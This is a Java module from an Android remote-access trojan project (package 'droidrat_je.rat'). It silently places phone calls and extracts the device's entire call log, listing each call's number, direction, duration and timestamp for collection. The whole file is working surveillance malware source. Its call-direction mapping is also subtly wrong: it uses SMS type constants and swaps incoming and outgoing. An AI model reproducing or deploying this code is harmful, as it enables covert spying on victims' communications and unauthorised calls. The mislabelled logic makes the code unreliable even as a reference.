package com.je_chen.droidrat_je.rat.modules.appintent.call;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.Telephony;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class Call {

    private final Context context;
    private final ContentResolver contentResolver;

    public Call(Context context) {
        this.context = context;
        contentResolver = context.getContentResolver();
    }

    public void call(String phoneNumber) {
        Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + phoneNumber));
        intent.setFlags(FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    public List<String> getCallLogs() {
        Cursor c = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        List<String> callLogList = new ArrayList<>();
        if (c != null) {
            while (c.moveToNext()) {
                String callDate = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DATE));
                String phNumber = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String callDuration = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                Date dateFormat = new Date(Long.parseLong(callDate));
                String callDayTimes = String.valueOf(dateFormat);
                String direction = null;
                switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)))) {
                    case Telephony.Sms.MESSAGE_TYPE_INBOX:
                        direction = "OUTGOING";
                        break;
                    case Telephony.Sms.MESSAGE_TYPE_SENT:
                        direction = "INGOING";
                        break;
                    case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                        direction = "MISSED";
                        break;
                    default:
                        break;
                }
                callLogList.add(phNumber + ":" + direction + ":" + callDuration + ":" + callDayTimes);
            }
            c.close();
        }
        return callLogList;
    }
}
